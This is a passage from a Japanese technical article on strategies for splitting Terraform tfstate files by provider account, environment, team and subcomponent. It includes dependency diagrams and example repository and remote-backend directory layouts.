\uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    │    ...│    │    │...リモートバックエンドの場合記事内のここ で、リモートバックエンドのディレクトリ構成についても言及しました。これらの層は、以下の通りリモートバックエンド自体・ディレクトリ構成の設計方法に影響します。# リモートバックエンド自体を分割する場合\uD83E\uDEA3 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    └── terraform.tfstate # 分割された状態を持つ│    ││    │...# リモートバックエンド内のディレクトリを分割する場合\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 上層/│    ├── \uD83D\uDCC2 中間層/│    │    ├── \uD83D\uDCC2 下層/│    │    │    └── terraform.tfstate # 分割された状態を持つ│    │    ││    │    │...07. 上層の分割 (推奨)上層の分割について上層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。プロバイダーのアカウント別 - ★★★この分割方法について上層分割の中でも、基本的な方法の1つです。プロバイダーのアカウント別にtfstateファイルを分割し、上層もこれに基づいて設計します。この分割方法により、各プロバイダーの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてtfstateファイルで状態を管理せざるを得ない場合があります。例えば、Kubernetesのプロバイダーは、EKSと同じtfstateファイルで管理した方がよいです\uD83D\uDC4DTerraform Registry【プロバイダーアカウント別】状態の依存関係図例えば、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各プロバイダーの tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロバイダーのアカウント別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        aws[\\"tfstate\\"]    end    aws -...-> datadog    aws -...-> healthchecks    aws -...-> pagerDuty    datadog -...-> aws    healthchecks -...-> aws    pagerDuty -...-> aws【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 datadog-repository/├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 healthchecks-repository/├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...\uD83D\uDC31 pagerduty-repository/├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf...▼ 同じリポジトリの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── backend.tf # AWSの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 datadog/│    ├── backend.tf # Datadogの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│├── \uD83D\uDCC2 healthchecks/│    ├── backend.tf # Healthchecksの状態を持つ tfstate ファイルを指定する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 pagerduty/      ├── backend.tf # PagerDutyの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ...【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 aws-bucket/│└── terraform.tfstate # AWSの状態を持つ\uD83E\uDEA3 datadog-bucket/│└── terraform.tfstate # Datadogの状態を持つ\uD83E\uDEA3 healthchecks-bucket/│└── terraform.tfstate # Healthchecksの状態を持つ\uD83E\uDEA3 pagerduty-bucket/│└── terraform.tfstate # PagerDutyの状態を持つ▼ 同じリモートバックエンドの場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws│    └── terraform.tfstate # AWSの状態を持つ│├── \uD83D\uDCC2 datadog│    └── terraform.tfstate # Datadogの状態を持つ│├── \uD83D\uDCC2 healthchecks│    └── terraform.tfstate # Healthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty      └── terraform.tfstate # PagerDutyの状態を持つ08. 下層の分割 (推奨)下層の分割について下層の分割は 推奨 です。Terraformに携わる管理者の数が少なくても採用した方がよいです。tfstateファイルをパターンに応じて分割し、これに基づいてディレクトリ・リモートバックエンドも設計しましょう。実行環境別 - ★★★この分割方法について下層分割の中でも、基本的な方法の1つです。実行環境別にtfstateファイルを分割し、下層もこれに基づいて設計します。この分割方法により、各実行環境の管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up and Running: Writing Infrastructure as CodeHow to manage Terraform state. A guide to file layout, isolation, and… | by Yevgeniy Brikman | Gruntwork▶ おすすめ度について【実行環境別】状態の依存関係図例えば、以下の実行環境を構築したい状況と仮定します。Tes環境 (検証環境)Stg環境 (ユーザー受け入れ環境)Prd環境 (本番環境)かつ、以下のプロバイダーを使用したい状況と仮定します。主要プロバイダー (AWS)アプリ/インフラ監視プロバイダー (Datadog)ジョブ監視プロバイダー (Healthchecks)インシデント管理プロバイダー (PagerDuty)ここで仮定した状況では、各実行環境の tfstate ファイルは他の実行環境には依存していないとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 実行環境別---%%{init:{\'theme\':\'default\'}}%%flowchart LR    subgraph PagerDuty        pagerDuty[\\"tfstate\\"]    end    subgraph Healthchecks        healthchecks[\\"tfstate\\"]    end    subgraph Datadog        datadog[\\"tfstate\\"]    end    subgraph AWS        subgraph tes-bucket            tes[\\"tfstate\\"]        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end    end    tes -...-> datadog    tes -...-> healthchecks    tes -...-> pagerDuty    datadog -...-> tes    healthchecks -...-> tes    pagerDuty -...-> tes【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境└── \uD83D\uDCC2 prd/ # Prd環境\uD83D\uDC31 datadog-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 healthchecks-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # HealthchecsのTes環境の状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/\uD83D\uDC31 pagerduty-repository/├── output.tf # 他の tfstate ファイルから依存される├── remote_state.tf # terraform_remote_state ブロックを使用する├── provider.tf├── \uD83D\uDCC2 tes/│    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/└── \uD83D\uDCC2 prd/▼ 同じリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のHealthchecksの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ├── \uD83D\uDCC2 tes/      │    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合実行環境別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。例えば、前述の依存関係図の状況と仮定します。\uD83E\uDEA3 tes-aws-bucket/│└── terraform.tfstate # Tes環境のAWSリソースの状態を持つ\uD83E\uDEA3 tes-datadog-bucket/│└── terraform.tfstate # Tes環境のDatadogの状態を持つ\uD83E\uDEA3 tes-healthchecks-bucket/│└── terraform.tfstate # Tes環境のHealthchecksの状態を持つ\uD83E\uDEA3 tes-pagerduty-bucket/│└── terraform.tfstate # Tes環境のPagerDutyの状態を持つ▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、AWSアカウント別に異なる実行環境を作成していると仮定します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 aws/│    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│├── \uD83D\uDCC2 datadog/│    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│├── \uD83D\uDCC2 healthchecks/│    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty/      └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、単一のAWSアカウント内に全実行環境を作成しているとします。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws/│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── \uD83D\uDCC2 tes/      │    └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/09. 中間層の分割 (任意)中間層の分割について中間層の分割は 任意 です。Terraformに携わる管理者が多くなるほど、効力を発揮します。運用チーム責務範囲別 - ★★この分割方法について運用チーム (例：アプリチーム、インフラチーム) のAWSリソースの責務範囲別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チームが互いに影響を受けずに、terraformコマンドの結果を得られるようになります。AWS CloudFormation best practices - AWS CloudFormationTerraform in Action (English Edition)▶ おすすめ度について【チーム別】状態の依存関係図例えば、以下の運用チームに分割した状況と仮定します。frontendチーム (アプリのフロントエンド領域担当)backendチーム (アプリのバックエンド領域担当)sreチーム (インフラ領域担当)ここで仮定した状況では、各チームが管理する tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            frontend[\\"frontend-team-tfstate<br>(CloudFront, S3, など)\\"]            backend[\\"backend-team-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]            sre[\\"sre-team-tfstate<br>(ALB, CloudWatch, EC2, ECS, EKS, IAM, VPC, など)\\"]            frontend-..->sre            backend-..->sre            sre-..->frontend            sre-..->backend        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/ # frontendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── cloudfront.tf├── s3.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する      ...\uD83D\uDC31 aws-backend-team-repository/ # backendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── elasticache.tf├── ses.tf├── sns.tf├── rds.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する       ...\uD83D\uDC31 aws-sre-team-repository/ # sreチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── alb.tf├── cloudwatch.tf├── ec2.tf├── ecs.tf├── eks.tf├── iam.tf├── vpc.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 frontend-team # frontendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 backend-team # backendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── ses.tf│    ├── sns.tf│    ├── rds.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 sre-team # sreチーム      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── alb.tf      ├── cloudwatch.tf      ├── ec2.tf      ├── ecs.tf      ├── eks.tf      ├── iam.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する           ...【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別の場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    └── terraform.tfstate # frontendチームの状態を持つ│├── \uD83D\uDCC2 backend-team│    └── terraform.tfstate # backendチームの状態を持つ│└── \uD83D\uDCC2 sre-team      └── terraform.tfstate # sreチームの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...プロダクトのサブコンポーネント別 - ★★この分割方法についてプロダクトのサブコンポーネント (例：アプリ、ネットワーク、認証/認可、監視など) 別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、サブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Things to Know Before Working With Terraform – Part 1 | EndavaTerraform organization — Part I : What if you split your components ? | by Amine Charot | Medium▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。この分割方法は、後述のAWSリソースの種類グループとごっちゃになってしまう場合があるため、プロダクトのサブコンポーネントとして意識的に分割させる必要があります\uD83D\uDC4D【サブコンポーネント別】状態の依存関係図例えば、以下のサブコンポーネントに分割した状況と仮定します。application (Web3層系)auth (認証/認可系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、networkサブコンポーネントやauthサブコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロダクトのサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, APIGateway, CloudFront, EC2, ECS, EKS, RDS, S3, SNS, など)\\"]            auth[\\"auth-tfstate<br>(IAMなど)\\"]            monitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            application-..->network            application-..->auth            monitor-..->application        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end        end【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── alb.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせてtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チーム内のサブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図以下の運用チームに分割した状況と仮定します。また、各運用チームでTerraformを変更できる管理者が相当数するため、プロダクトのサブコンポーネント別にも分割したとします。frontendチームapplicationmonitorbackendチームapplicationmonitorsreチームapplicationauthmonitornetworkここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、sreチームの管理する tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            subgraph frontend-team               frontendApplication[\\"application-tfstate<br>(CloudFront, S3, など)\\"]               frontendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph backend-team                backendApplication[\\"application-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]                backendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph sre-team                sreApplication[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, EC2, ECS, EKS, SNS, など)\\"]                auth[\\"auth-tfstate<br>(IAM, など)\\"]                sreMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]                network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            end            frontendApplication-...->network            sreApplication-...->auth            sreApplication-...->network            backendApplication-...->auth            backendApplication-...->network            frontendMonitor-...->frontendApplication            sreMonitor-...->sreApplication            backendMonitor-...->backendApplication        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── ses.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── 